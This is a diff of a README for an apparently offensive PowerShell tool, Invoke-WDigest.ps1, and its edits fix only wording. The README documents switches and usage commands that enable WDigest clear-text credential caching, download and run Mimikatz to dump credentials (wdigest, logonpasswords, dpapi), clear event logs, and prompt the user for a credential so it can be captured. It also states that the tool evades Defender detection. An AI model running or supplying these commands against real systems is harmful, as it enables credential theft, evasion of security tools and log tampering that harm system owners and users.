@@ -10,16 +10,16 @@
 |---|---|---|
 |WDigest|Activate WDigest credential caching in Memory?|<b><i>true</i></b>|
 |ManyCats|Switch that downloads\executes Mimikatz to dump credentials *|<b><i>false</i></b>|
-|RunAs|Switch that promps user for credential input and store it in memory|<b><i>false</i></b>|
+|RunAs|Switch that prompts user for credential input and store it in memory|<b><i>false</i></b>|
 |DcName|Switch of RunAs command that accepts USER@DOMAIN or DOMAIN\USER<br />Remark: this function requires <b><i>-RunAs</i></b> parameter switch declaration|<b><i>$Env:COMPUTERNAME\\$Env:USERNAME</i></b>|
-|Module|Mimikatz selection of dump::modules to run|<b><i>sekurlsa::wdigest exit</i></b>|
+|Module|Mimikatz selection of dump::modules to auto-run|<b><i>sekurlsa::wdigest exit</i></b>|
 
-<b><i>* Invoke-WDigest.ps1 cmdlet only bypasses mimikatz detection if windows defender its the only AV running in target system</i></b><br />
-Execute [GetCounterMeasures.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/bin/GetCounterMeasures.ps1) cmdlet to enumerated common security processes running! before executing Invoke-WDigest.ps1
+<b><i>* Invoke-WDigest.ps1 cmdlet only bypasses mimikatz detection if windows defender its the only AV running in target system.</i></b><br />
+Execute [GetCounterMeasures.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/bin/GetCounterMeasures.ps1) cmdlet to enumerated common security processes running before executing Invoke-WDigest.ps1
 
 <br />
 
-**download script:**
+**download Invoke-WDigest.ps1:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
 ```
@@ -34,23 +34,23 @@ Get-Help .\Invoke-WDigest.ps1 -full
 # Execute Mimikatz (interactive shell) without WDigest caching
 .\Invoke-WDigest.ps1 -wdigest 'false' -manycats
 
-#  Ativate WDigest caching + Execute Mimikatz sekurlsa::wdigest exit
+#  Ativate WDigest caching + Execute Mimikatz 'sekurlsa::wdigest exit'
 .\Invoke-WDigest.ps1 -wdigest 'true' -manycats
 
-# Ativate WDigest caching + Exec M[i]mika[t]z 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump::modules
-.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi event::clear exit'
+# Ativate WDigest caching + Execute Mimikatz 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump modules.
+.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi event::clear'
 
 
 [FAST DEMONSTRATION]
 
-## Ativate WDigest caching + dump created credential
+## WDigest caching + dump (-runas) created credential with mimikatz (sekurlsa::wdigest)
 .\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas
 
 WORKFLOW
    - Invoke-WDigest.ps1 Ativates WDigest caching in memory
    - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
-   - WDigest will store credential input by user in clear-text in memory
-   - mimikatz will auto-execute 'sekurlsa::wdigest exit' to dump credentials
+   - WDigest will store (runas) credential input by user in clear-text in memory
+   - mimikatz will auto-execute 'mimikatz sekurlsa::wdigest exit' to dump credentials
 
 REMARK
    RunAs parameter switch exists for demonstration effects, and can not be
